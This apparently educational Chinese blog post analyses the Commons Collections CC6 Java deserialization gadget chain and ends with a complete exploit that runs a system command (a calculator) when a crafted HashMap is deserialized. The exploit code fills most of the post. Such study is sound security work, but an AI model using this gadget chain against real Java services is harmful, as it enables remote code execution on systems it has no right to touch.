---
title: Java反序列化-CC6链
date: 2026-03-12
category: Java
tags: ["web", "ctf", "Java反序列化"]
excerpt: 我的天啊，Java大人
---


# Java反序列化-CC6链

## 0x01 写在前面

先说一说 CC6 链与 CC1 链的一些不同之处吧， CC6 链的要求不像CC1链那么高，CC6可以不受 jdk 版本制约。

如果用一句话介绍一下 CC6，那就是 **CC6 = CC1 + URLDNS** 

CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链

## 0x02 CC6链分析

###  1.  找尾方法

前面说了"CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链"

其实调用的危险方法的还是`InvokerTransformer.transform()`完成`exec()`的执行

```TypeScript
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

### 2.  找中间链

`LazyMap`类的`get()`方法中实现了`transform()`的调用，调用其的属性`factory`由`decorate()`获取，和正版CC1链一样就不多赘述了，先写个小demo实现一下

```Java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
Map lazyMap = LazyMap.decorate(new HashMap<>(),invokerTransformer);
Class c = LazyMap.class;
Method getMethod = c.getMethod("get", Object.class);
getMethod.invoke(lazyMap, r);
```

既然是`get()`方法触发，接下来就找调用`gey()`的其他类呗，随后我们来到了`TiedMapEntry`类

```Java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
    ...
    
    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }
    
    public Object getValue() {
        return map.get(key);
    }
    
    ...
}
```

`map`属性调用`get()`，只需要在`TiedMapEntry构造方法`中将`lazyMap`赋值给`TiedMapEntry.key`就行

demo实现:

```Java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

Map lazyMap = LazyMap.decorate(new HashMap<>(),chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,null);
tiedMapEntry.getValue();
```

接下找调用`getValue()`的地方，因为 `getValue()` 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况，果不其然

```Java
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode()); 
}
```

1. ### 找入口类

找到`hashCode()`后，后续的构造基本上都是：

```Java
xxx.readObject()
        HashMap.put() --自动调用-->   HashMap.hash()
                后续利用链.hashCode()
```

更巧的是，这里的 HashMap 类本身就是一个非常完美的**入口类**

```Java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

Map lazyMap = LazyMap.decorate(new HashMap<>(),chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,null);
HashMap hashMap = new HashMap();
hashMap.put(tiedMapEntry,null);
```

但是当我们尝试对其进行序列而没有进行反序列化时就能够弹出计算器，太奇怪了，这与 URLDNS 链中的情景其实是差不多的，所以说: CC6 = CC1 + URLDNS，这个问题需要去解决

```Java
Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  
 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");  
 HashMap<Object, Object> expMap = new HashMap<>();  
 expMap.put(tiedMapEntry, "value");  
  
 serialize(expMap);  
 unserialize("ser.bin"); 
```

1. ### 解决问题

在序列化时触发命令执行的原因参考 URLDNS链，在进行put()操作时触发 我们的想法是修改链子中的某些属性，让链子先完成`put()`操作后再将属性修改为回来

尝试修改`lazyMap`中的`factory`属性，完成完成`put()`操作后再将修改为为`chainedTransformer`

```Java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> hashMap = new HashMap<>();
Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
HashMap<Object, Object> expMap = new HashMap<>();
expMap.put(tiedMapEntry, "value");

Class c = LazyMap.class;
Field fieldfactory = c.getDeclaredField("factory");
fieldfactory.setAccessible(true);
fieldfactory.set(lazyMap,chainedTransformer);

serialize(expMap);
unserialize("ser.bin");
```

序列化没问题了，但是反序列化又没有成功执行命令

看来还是得进入`put()`寻找问题，打上断点进行调试

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC6.png)

进入HshMap中的`hash()`*方法*

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC61.png)

在`hash()`方法中调用`hashCode()`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC62.png)

在`hashCode()`中调用`getValue()`获取value值

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC63.png)

实际上就是获取map中key对应的value

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC64.png)

进入`get()`方法，我们找到了关键点

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC65.png)

```TypeScript
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

如果 `key` 不存在，就用 `factory.transform(key)` 动态生成一个值并存入 map，然后返回；如果存在，就直接返回已有值

当执行反序列化时`key`就已经存在，因此不会进入if代码块，但是我们又需要执行`chainedTransformer.transform()`,因此需要在重新设置`factory`之前移除`lazyMap`中的`key`值

1. ### 最终exp

```Java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> hashMap = new HashMap<>();
Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
HashMap<Object, Object> expMap = new HashMap<>();
expMap.put(tiedMapEntry, "value");
lazyMap.remove("key");


Class c = LazyMap.class;
Field fieldfactory = c.getDeclaredField("factory");
fieldfactory.setAccessible(true);
fieldfactory.set(lazyMap,chainedTransformer);

serialize(expMap);
unserialize("ser.bin");
```

命令执行成功

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC6/CC66.png)

## 0x03 小结

利用链

```Java
ObjectInputStream.readObject()
    HashMap.put()
    HashMap.hash()
            TiedMapEntry.hashCode()
            TiedMapEntry.getValue()
                LazyMap.get()
                    ChainedTransformer.transform()
                        InvokerTransformer.transform()
                            Runtime.exec()
```

参考

https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/

https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=52eba7627ed3e9842c78702b92c1bba9
